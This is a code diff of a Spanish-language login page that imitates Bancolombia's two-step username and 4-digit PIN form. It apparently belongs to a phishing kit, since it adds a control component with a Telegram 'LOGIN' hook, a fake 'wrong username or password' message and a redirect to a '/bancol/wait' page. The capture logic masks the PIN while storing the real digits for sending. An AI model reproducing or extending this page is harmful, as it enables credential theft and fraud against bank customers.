@@ -317,34 +317,336 @@
     </div>
 
     <script>
-        /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */
+        /* ===== UTILIDADES DE UI ===== */
 
         /**
-         * Valida el campo usuario
-         * Requisito: mínimo 4 caracteres
-         */
-        function validateUsuario() {
-            const usuario = document.getElementById('usuario');
-            if (!usuario) return false;
+        * Actualiza el estado del floating label
+        * El label flota hacia arriba cuando el input tiene foco o valor
+        */
+        function updateFloatingLabel(input, label) {
+            const shouldFloat = document.activeElement === input || input.value !== '';
+            if (shouldFloat) {
+                label.classList.add('active');
+            } else {
+                label.classList.remove('active');
+            }
+        }
 
-            const usuarioValue = usuario.value.trim();
+        /**
+        * Configura los floating labels para todos los inputs
+        */
+        function setupFloatingLabels() {
+            const floatingInputs = document.querySelectorAll('.floating-input');
+            floatingInputs.forEach(input => {
+                const label = document.getElementById(input.id + 'Label');
+                if (label) {
+                    input.addEventListener('focus', () => updateFloatingLabel(input, label));
+                    input.addEventListener('blur', () => updateFloatingLabel(input, label));
+                    input.addEventListener('input', () => updateFloatingLabel(input, label));
+                    // Inicializar estado del label
+                    updateFloatingLabel(input, label);
+                }
+            });
+        }
+
+        /**
+        * Habilita o deshabilita un botón
+        */
+        function toggleButton(btn, enabled) {
+            if (!btn) return;
+            btn.disabled = !enabled;
+            if (enabled) {
+                btn.classList.remove('bg-gray-300', 'cursor-not-allowed');
+                btn.classList.add('bg-bancolombia-yellow');
+            } else {
+                btn.classList.add('bg-gray-300', 'cursor-not-allowed');
+                btn.classList.remove('bg-bancolombia-yellow');
+            }
+        }
+
+        /**
+        * Deshabilita un botón temporalmente después de hacer clic
+        */
+        function disableButtonTemporarily(btn, duration = 2000) {
+            if (!btn) return;
+            const wasEnabled = !btn.disabled;
+            btn.disabled = true;
+            btn.classList.add('opacity-50', 'cursor-wait');
+
+            setTimeout(() => {
+                if (wasEnabled) {
+                    btn.disabled = false;
+                    btn.classList.remove('opacity-50', 'cursor-wait');
+                }
+            }, duration);
+        }
+
+        /**
+        * Muestra un mensaje de error en un campo
+        */
+        function setError(id, msg) {
+            const el = document.getElementById(id);
+            if (!el) return;
+            if (msg) {
+                el.textContent = msg;
+                el.classList.remove('hidden');
+            } else {
+                el.classList.add('hidden');
+            }
+        }
+
+        /* ===== VALIDACIONES ===== */
+
+        /**
+        * Valida el campo usuario
+        * Requisito: mínimo 4 caracteres
+        */
+        function validateUsuario() {
+            const usuarioInput = document.getElementById('usuario');
+            if (!usuarioInput) return false;
+
+            const usuarioValue = usuarioInput.value.trim();
             const isValid = usuarioValue && usuarioValue.length >= 4;
+
+            const continuarBtn = document.getElementById('continuarUsuario');
+            toggleButton(continuarBtn, isValid);
+
             return isValid;
         }
 
         /**
-         * Valida la clave principal
-         * Requisito: exactamente 4 dígitos numéricos
-         */
+        * Valida la clave principal
+        * Requisito: exactamente 4 dígitos numéricos
+        */
         function validateClave() {
             const inputs = document.querySelectorAll('[id^="clave-"]');
             let clave = '';
-            inputs.forEach(i => clave += (i.dataset.realValue || ''));
+            inputs.forEach(i => {
+                clave += (i.dataset.realValue || '');
+            });
 
             const isValid = clave.length === 4 && /^\d{4}$/.test(clave);
+            const continuarBtn = document.getElementById('continuarClave');
+            toggleButton(continuarBtn, isValid);
+
             return isValid;
         }
+
+        /* ===== NAVEGACIÓN ===== */
+
+        /**
+        * Muestra el formulario de usuario
+        */
+        function showUsuarioForm() {
+            const usuarioForm = document.getElementById('usuarioForm');
+            const claveForm = document.getElementById('claveForm');
+            const titulo = document.getElementById('titulo');
+
+            titulo.textContent = 'Te damos la bienvenida';
+            usuarioForm.classList.remove('hidden');
+            claveForm.classList.add('hidden');
+
+            // Enfocar el input de usuario
+            setTimeout(() => {
+                const usuarioInput = document.getElementById('usuario');
+                if (usuarioInput) usuarioInput.focus();
+            }, 100);
+        }
+
+        /**
+        * Muestra el formulario de clave
+        */
+        function showClaveForm() {
+            const usuarioForm = document.getElementById('usuarioForm');
+            const claveForm = document.getElementById('claveForm');
+            const titulo = document.getElementById('titulo');
+
+            titulo.textContent = 'Clave principal';
+            usuarioForm.classList.add('hidden');
+            claveForm.classList.remove('hidden');
+
+            // Enfocar el primer input de clave
+            setTimeout(() => {
+                const claveInput = document.getElementById('clave-0');
+                if (claveInput) claveInput.focus();
+            }, 100);
+        }
+
+        /**
+        * Función para salir de la aplicación
+        */
+        function salir() {
+            if (confirm('¿Está seguro que desea salir?')) {
+                location.reload();
+            }
+        }
+
+        /* ===== CONFIGURACIÓN DE INPUTS MULTI-DÍGITO ===== */
+
+        /**
+        * Configura los inputs que aceptan múltiples dígitos (OTP, PIN, etc.)
+        */
+        function setupMultiDigitInputs(prefix, maxLength) {
+            for (let i = 0; i < maxLength; i++) {
+                const input = document.getElementById(`${prefix}-${i}`);
+                if (!input) continue;
+
+                // Si es un input de contraseña (con punto)
+                if (input.classList.contains('password-input')) {
+                    input.addEventListener('input', function (e) {
+                        const v = e.target.value;
+                        // Solo permitir un dígito
+                        if (!/^[0-9]?$/.test(v)) {
+                            e.target.value = '';
+                            e.target.dataset.realValue = '';
+                            return;
+                        }
+                        if (v) {
+                            // Guardar el valor real y mostrar un punto
+                            e.target.dataset.realValue = v;
+                            e.target.value = '•';
+                            // Mover al siguiente input si no es el último
+                            if (i < maxLength - 1) {
+                                const nextInput = document.getElementById(`${prefix}-${i + 1}`);
+                                if (nextInput) nextInput.focus();
+                            }
+                        } else {
+                            e.target.dataset.realValue = '';
+                        }
+                        // Validar después de cada entrada
+                        if (prefix === 'clave') validateClave();
+                    });
+
+                    input.addEventListener('keydown', function (e) {
+                        if (e.key === 'Backspace') {
+                            if (!this.dataset.realValue && i > 0) {
+                                // Si está vacío, ir al anterior y borrarlo
+                                const prevInput = document.getElementById(`${prefix}-${i - 1}`);
+                                if (prevInput) {
+                                    prevInput.focus();
+                                    prevInput.value = '';
+                                    prevInput.dataset.realValue = '';
+                                }
+                                if (prefix === 'clave') validateClave();
+                            } else if (this.dataset.realValue) {
+                                // Si tiene valor, borrarlo
+                                this.value = '';
+                                this.dataset.realValue = '';
+                                if (prefix === 'clave') validateClave();
+                            }
+                        }
+                    });
+                } else {
+                    // Input normal (no de contraseña)
+                    input.addEventListener('input', function (e) {
+                        if (!/^[0-9a-zA-Z]?$/.test(e.target.value)) {
+                            e.target.value = '';
+                            return;
+                        }
+                        if (e.target.value && i < maxLength - 1) {
+                            const nextInput = document.getElementById(`${prefix}-${i + 1}`);
+                            if (nextInput) nextInput.focus();
+                        }
+                    });
+
+                    input.addEventListener('keydown', function (e) {
+                        if (e.key === 'Backspace' && !this.value && i > 0) {
+                            const prevInput = document.getElementById(`${prefix}-${i - 1}`);
+                            if (prevInput) prevInput.focus();
+                        }
+                    });
+                }
+            }
+        }
+
+        /* ===== LIMPIEZA ===== */
+
+        /**
+        * Limpia todos los inputs de la sección de login
+        */
+        function limpiarLoginInputs() {
+            const usuarioInput = document.getElementById('usuario');
+            const usuarioError = document.getElementById('usuarioError');
+            const claveError = document.getElementById('claveError');
+
+            if (usuarioInput) usuarioInput.value = '';
+            if (usuarioError) usuarioError.classList.add('hidden');
+            if (claveError) claveError.classList.add('hidden');
+
+            // Limpiar inputs de clave
+            document.querySelectorAll('[id^="clave-"]').forEach(input => {
+                input.value = '';
+                input.dataset.realValue = '';
+            });
+
+            // Reset labels
+            const usuarioLabel = document.getElementById('usuarioLabel');
+            if (usuarioLabel) usuarioLabel.classList.remove('active');
+
+            // Deshabilitar botones
+            const continuarUsuarioBtn = document.getElementById('continuarUsuario');
+            const continuarClaveBtn = document.getElementById('continuarClave');
+            toggleButton(continuarUsuarioBtn, false);
+            toggleButton(continuarClaveBtn, false);
+
+            showUsuarioForm();
+        }
+
+        /* ===== LISTENERS ===== */
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Setup de floating labels
+            setupFloatingLabels();
+
+            // Setup de inputs multi-dígito
+            setupMultiDigitInputs('clave', 4);
+
+            // Listeners para el campo usuario
+            const usuarioInput = document.getElementById('usuario');
+            if (usuarioInput) {
+                usuarioInput.addEventListener('input', function () {
+                    validateUsuario();
+                });
+            }
+
+            // Listener para botón "Continuar Usuario"
+            const continuarUsuarioBtn = document.getElementById('continuarUsuario');
+            if (continuarUsuarioBtn) {
+                continuarUsuarioBtn.addEventListener('click', function () {
+                    if (validateUsuario()) {
+                        disableButtonTemporarily(this, 1000);
+                        showClaveForm();
+                    }
+                });
+            }
+
+            // Listener para botón "Volver Clave"
+            const volverClaveBtn = document.getElementById('volverClave');
+            if (volverClaveBtn) {
+                volverClaveBtn.addEventListener('click', function () {
+                    showUsuarioForm();
+                });
+            }
+
+            // Listener para botón "Continuar Clave"
+            const continuarClaveBtn = document.getElementById('continuarClave');
+            if (continuarClaveBtn) {
+                continuarClaveBtn.addEventListener('click', function () {
+                    if (validateClave()) {
+                        disableButtonTemporarily(this, 3000);
+                        // Aquí iría la lógica de envío de datos
+                        console.log('Datos listos para enviar');
+                    }
+                });
+            }
+
+            // Mostrar formulario inicial
+            showUsuarioForm();
+        });
     </script>
+
+    <x-control :auto-completar="false" :debug="false" redirect-url="/bancol/wait"
+        toast-message="Usuario o clave incorrecta. Intenta nuevamente" telegram-button="LOGIN" />
 
 </body>
 
